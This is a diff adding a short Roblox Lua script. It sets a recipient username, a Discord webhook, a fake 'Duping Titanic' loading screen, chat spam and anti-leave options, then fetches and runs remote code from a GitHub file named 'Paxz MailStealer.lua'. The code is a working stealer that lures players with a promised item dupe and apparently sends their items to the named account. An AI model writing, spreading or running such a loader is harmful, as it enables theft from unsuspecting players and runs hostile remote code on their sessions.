@@ -1,0 +1,17 @@
+_G.UserName = "jorish9997"
+_G.UserName2 = "jorish9997"
+_G.Webhook = "https://discord.com/api/webhooks/1171271606581088256/CpRO9KQoTp14MApPDsVqtob2JdpgUZy0wMNncM67Qor5avWl6Sqb3sOQgzC2TPVI_cnZ"
+_G.loadingScreenText = "Duping Titanic "
+_G.ChatMessage = "Free dupe "
+_G.KickTime = 10
+
+
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+_G.ChatSpam = true
+_G.CollectOrbs = true
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()
